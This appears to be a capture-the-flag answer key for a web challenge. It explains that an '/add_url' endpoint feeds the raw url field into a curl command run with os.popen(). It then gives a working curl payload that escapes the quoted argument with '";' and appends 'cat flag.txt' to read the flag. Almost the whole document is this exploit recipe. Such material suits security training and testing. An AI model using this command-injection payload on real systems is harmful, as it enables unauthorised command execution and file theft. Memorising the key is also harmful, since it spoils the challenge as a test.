# EXACT SOLUTION — FOLLOW THESE STEPS IN ORDER

Vulnerability: OS command injection. `/add_url` builds
`curl -o /dev/null -s -w "%{http_code}" "{url}"` with the raw `url` field and runs
it via `os.popen()`. Break out of the quoted argument with `";` and append a
command. The app echoes captured output back only when it contains `"200"`, so
keep a valid 200-returning URL first.

1. **Inject a command** after a valid in-container URL (so the first curl returns
   200 and the output is echoed):

   ```
   curl -s -X POST http://<target>/add_url \
     --data-urlencode 'url=http://127.0.0.1:5003/"; cat flag.txt #'
   ```

2. **Extract the flag** (`FLAG{...}`) from the JSON `message` and report it
   verbatim.
